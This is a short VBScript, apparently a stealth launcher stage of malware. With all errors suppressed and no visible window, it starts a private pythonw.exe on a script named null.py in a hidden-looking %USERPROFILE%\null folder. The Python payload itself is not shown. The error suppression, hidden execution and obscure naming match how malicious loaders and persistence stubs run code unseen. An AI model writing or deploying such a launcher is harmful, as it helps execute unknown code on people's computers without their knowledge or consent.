On Error Resume Next
Set shell = CreateObject("WScript.Shell")
p = shell.ExpandEnvironmentStrings("%USERPROFILE%\null")
shell.Run Chr(34) & p & "\python\pythonw.exe" & Chr(34) & " " & Chr(34) & p & "\null.py" & Chr(34), 0, False
